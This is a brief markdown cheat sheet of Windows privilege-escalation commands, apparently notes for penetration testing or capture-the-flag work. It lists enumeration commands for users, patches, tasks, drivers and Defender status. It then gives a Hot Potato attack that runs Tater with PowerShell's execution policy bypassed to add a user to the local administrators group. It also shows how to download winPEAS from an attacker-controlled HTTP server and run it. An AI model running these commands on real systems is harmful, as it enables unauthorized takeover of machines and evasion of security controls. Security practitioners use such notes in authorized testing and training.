### Information Gathering
User Enumeration
- `whoami /priv` Current user privileges
- `net users` List users
- `net user $username` Detail of a specific user
- `qwinsta` Other users logged in

<!-- -->
Systeminfo
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"` get OS version

<!-- -->
 Patch level
 - `wmic qfe get Caption,Description,HotFixID,InstalledOn` list updates on system

<!-- -->
 Scheduled Tasks
 - `schtasks /query /fo LIST /v` query scheduled tasks

<!-- -->
Drivers
- `driverquery` list drivers installed

<!-- -->
Antivirus
- `sc query windefend` is windows Defender on?

### Hot Potato
cmd:
- `powershell.exe -nop -ep bypass`
<!-- -->

Powershell
- `Import-Module  C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
- `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`

### Winpeas.exe
Local:
- `python -m SimpleHTTPServer 80`

<!-- -->
Remote: 
- `powershell.exe -command IWR -Uri $IP/winpeas.exe -OutFile winpeas.exe"`
- `winpeas.exe`
 <!-- -->
 
 [Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)